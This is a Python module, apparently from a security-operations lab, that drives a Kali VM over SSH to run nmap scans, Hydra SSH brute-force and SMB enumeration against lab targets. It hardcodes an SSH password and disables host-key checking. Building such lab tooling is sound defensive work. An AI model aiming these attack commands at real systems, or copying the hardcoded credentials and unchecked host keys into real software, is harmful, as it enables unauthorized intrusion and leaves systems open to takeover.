"""
AgeixAISOC — Lab Bridge (Paramiko SSH Abstraction).

Unified SSH client for interacting with live lab VMs over 192.168.56.0/24:
  - Kali Linux   (192.168.56.10)  — attack platform, runs nmap / hydra
  - Windows 10   (192.168.56.20)  — victim endpoint
  - Metasploitable 2 (192.168.56.40) — vulnerable target
  - Wazuh SIEM   (192.168.56.30)  — log management
  - AD Server   (192.168.56.100) — Active Directory
  - FortiGate   (192.168.56.2)   — firewall / SOAR enforcement (CLI)
"""

import asyncio
import logging
from dataclasses import dataclass
from typing import Any, Optional

import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException

logger = logging.getLogger("AgeixAI.lab_bridge")


@dataclass
class SshHost:
    hostname: str
    port: int = 22
    username: str = "root"
    password: str = ""
    key_file: str = ""


class LabBridge:
    def __init__(self, hosts: dict[str, SshHost] | None = None):
        self._hosts: dict[str, SshHost] = {}
        if hosts:
            self._hosts.update(hosts)

    def register_host(self, name: str, host: SshHost) -> None:
        self._hosts[name] = host

    def get_host(self, name: str) -> Optional[SshHost]:
        return self._hosts.get(name)

    # -------------------------------------------------------------------
    # Low-level SSH execution (blocking, runs in executor)
    # -------------------------------------------------------------------

    def _ssh_exec(self, host: SshHost, command: str, timeout: int = 30) -> dict:
        import paramiko

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            connect_kwargs = {
                "hostname": host.hostname,
                "port": host.port,
                "username": host.username,
                "timeout": timeout,
            }
            if host.key_file:
                connect_kwargs["key_filename"] = host.key_file
            else:
                connect_kwargs["password"] = host.password

            client.connect(**connect_kwargs)

            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            exit_code = stdout.channel.recv_exit_status()
            output = stdout.read().decode("utf-8", errors="replace")
            error = stderr.read().decode("utf-8", errors="replace")
            client.close()

            return {
                "success": exit_code == 0,
                "exit_code": exit_code,
                "stdout": output,
                "stderr": error,
            }
        except Exception as exc:
            logger.warning("SSH exec failed on %s: %s", host.hostname, exc)
            return {"success": False, "exit_code": -1, "stdout": "", "stderr": str(exc)}

    async def execute(self, host_name: str, command: str, timeout: int = 30) -> dict:
        host = self._hosts.get(host_name)
        if not host:
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": f"Unknown host '{host_name}'",
            }
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._ssh_exec, host, command, timeout)

    async def check_reachability(self, host_name: str) -> dict:
        return await self.execute(host_name, "echo reachable && uptime", timeout=10)

    # -------------------------------------------------------------------
    # Real offensive security actions
    # -------------------------------------------------------------------

    async def run_nmap_scan(
        self,
        kali_host: str,
        target_ip: str,
        port_spec: str = "-sS -p 445 --open -T4",
    ) -> dict:
        """Run a real Nmap SYN scan from Kali against a target IP."""
        command = f"nmap {port_spec} {target_ip}"
        logger.info("LabBridge: nmap scan from %s -> %s (%s)", kali_host, target_ip, command)
        return await self.execute(kali_host, command, timeout=120)

    async def run_hydra_bruteforce(
        self,
        kali_host: str,
        target_ip: str,
        service: str = "ssh",
        user: str = "msfadmin",
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
    ) -> dict:
        """Run a real Hydra brute-force from Kali against a target."""
        command = (
            f"hydra -l {user} -P {wordlist} {service}://{target_ip} "
            f"-t 4 -w 10 -f -o /tmp/hydra_result.txt 2>/dev/null; "
            f"cat /tmp/hydra_result.txt 2>/dev/null || echo 'No result file'"
        )
        logger.info("LabBridge: hydra brute-force from %s -> %s:%s", kali_host, target_ip, service)
        return await self.execute(kali_host, command, timeout=300)

    async def run_smb_enum(
        self,
        kali_host: str,
        target_ip: str,
    ) -> dict:
        """Enumerate SMB shares on target using smbclient from Kali."""
        command = f"smbclient -L //{target_ip}/ -N -g 2>&1 | head -50"
        logger.info("LabBridge: SMB enum from %s -> %s", kali_host, target_ip)
        return await self.execute(kali_host, command, timeout=60)

    async def trigger_ping_flood(
        self,
        kali_host: str,
        target_ip: str,
        count: int = 5,
    ) -> dict:
        """ICMP ping test from Kali to a target."""
        command = f"ping -c {count} {target_ip}"
        return await self.execute(kali_host, command, timeout=30)

    # -------------------------------------------------------------------
    # Composite attack launcher
    # -------------------------------------------------------------------

    ATTACK_MENU = {
        "nmap_win10": {
            "description": "Nmap SYN scan against Windows 10 (port 445)",
            "kali_host": "kali",
            "target_host": "win10",
            "runner": "run_nmap_scan",
            "args": {"port_spec": "-sS -p 445 --open -T4"},
        },
        "nmap_metasploitable": {
            "description": "Nmap full scan against Metasploitable 2",
            "kali_host": "kali",
            "target_host": "metasploitable",
            "runner": "run_nmap_scan",
            "args": {"port_spec": "-sS -p- --min-rate=1000 -T4"},
        },
        "hydra_metasploitable": {
            "description": "Hydra SSH brute-force against Metasploitable",
            "kali_host": "kali",
            "target_host": "metasploitable",
            "runner": "run_hydra_bruteforce",
            "args": {"service": "ssh", "user": "msfadmin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
        },
        "smb_win10": {
            "description": "SMB share enumeration against Windows 10",
            "kali_host": "kali",
            "target_host": "win10",
            "runner": "run_smb_enum",
            "args": {},
        },
        "ping_win10": {
            "description": "ICMP ping test to Windows 10",
            "kali_host": "kali",
            "target_host": "win10",
            "runner": "trigger_ping_flood",
            "args": {"count": 5},
        },
    }

    async def run_attack_by_name(self, attack_name: str) -> dict:
        """Look up an attack by name in the menu and execute it."""
        entry = self.ATTACK_MENU.get(attack_name)
        if not entry:
            return {"success": False, "error": f"Unknown attack '{attack_name}'"}

        target_host_obj = self._hosts.get(entry["target_host"])
        if not target_host_obj:
            return {"success": False, "error": f"Target host '{entry['target_host']}' not registered"}

        runner = getattr(self, entry["runner"])
        return await runner(entry["kali_host"], target_host_obj.hostname, **entry["args"])


# ---------------------------------------------------------------------------
# Standalone Kali attack helper (hardcoded credentials)
# ---------------------------------------------------------------------------

KALI_HOST = "192.168.56.10"
KALI_USER = "aziz"
KALI_PASS = "8394"
KALI_PORT = 22


def execute_kali_attack(attack_type: str) -> str:
    """Connect to Kali via SSH and execute an attack command.

    Args:
        attack_type:
            "nmap_windows"       — nmap -sV -A 192.168.56.20
            "hydra_metasploitable" — hydra brute-force against Metasploitable

    Returns:
        Combined stdout+stderr as a UTF-8 string on success,
        or an error message string on failure.
    """
    if attack_type == "nmap_windows":
        command = "nmap -sV -A 192.168.56.20"
    elif attack_type == "hydra_metasploitable":
        command = "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.40 -t 4"
    else:
        return f"Unknown attack_type: {attack_type}"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=KALI_HOST,
            port=KALI_PORT,
            username=KALI_USER,
            password=KALI_PASS,
            timeout=30,
        )

        stdin, stdout, stderr = client.exec_command(command, timeout=120)
        exit_code = stdout.channel.recv_exit_status()
        output = stdout.read().decode("utf-8", errors="replace")
        error = stderr.read().decode("utf-8", errors="replace")
        client.close()

        combined = output + error
        if exit_code != 0:
            logger.warning("Kali attack '%s' exited with code %d", attack_type, exit_code)
        return combined

    except AuthenticationException:
        return "Authentication failed: check SSH username or password"
    except SSHException as exc:
        return f"SSH error: {exc}"
    except Exception as exc:
        return f"Unexpected error: {exc}"
    finally:
        client.close()
